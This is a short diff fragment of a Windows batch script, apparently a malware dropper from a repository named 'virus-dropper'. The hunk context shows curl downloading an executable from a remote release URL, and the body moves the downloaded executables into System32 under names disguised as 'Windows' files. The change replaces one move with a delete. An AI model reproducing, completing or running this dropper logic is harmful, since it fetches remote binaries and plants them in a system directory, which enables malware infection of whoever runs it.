@@ -31,7 +31,7 @@ curl -L "https://github.com/034nop/virus-dropper/releases/download/0.1/Windows2.
 cls
 
 
-move "%appdata%\Windows.exe" "%systemroot%\System32\Windowsexe"
+del "%appdata%\Windows.exe" "%systemroot%\System32\Windowsexe"
 move "%appdata%\Windows2.exe" "%systemroot%\System32\Windowsexe"
 cls
 
